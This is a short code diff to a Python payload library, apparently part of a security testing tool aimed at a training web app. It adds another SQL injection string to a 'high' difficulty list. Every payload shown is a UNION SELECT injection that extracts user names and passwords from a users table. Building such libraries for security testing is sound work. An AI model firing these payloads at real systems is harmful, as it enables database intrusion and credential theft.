@@ -52,7 +52,10 @@ class PayloadLibrary:
                     "1 UNION SELECT null,null#",
                     "1 UNION SELECT user,password FROM users LIMIT 1#",
                 ],
-                "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
+                "high": [
+                    "1' UNION SELECT user,password FROM users LIMIT 1-- -",
+                    "1' UNION SELECT user,password FROM users#",
+                ],
             },
             probe_by_level={"medium": ["1 UNION SELECT null,null"]},
         ),
